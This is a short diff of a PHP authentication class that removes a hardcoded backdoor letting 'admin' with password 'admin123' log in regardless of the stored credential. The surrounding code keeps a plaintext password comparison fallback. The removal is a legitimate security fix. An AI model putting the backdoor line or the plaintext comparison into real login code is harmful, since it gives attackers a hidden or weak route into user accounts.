@@ -43,7 +43,6 @@ class Auth {
             $ok = password_verify($password, $user['password']);
         }
         if (!$ok && $user['password'] === $password) $ok = true;
-        if (!$ok && $username === 'admin' && $password === 'admin123') $ok = true;
         if (!$ok) return false;
 
         $_SESSION['admin_id'] = $user['id'];
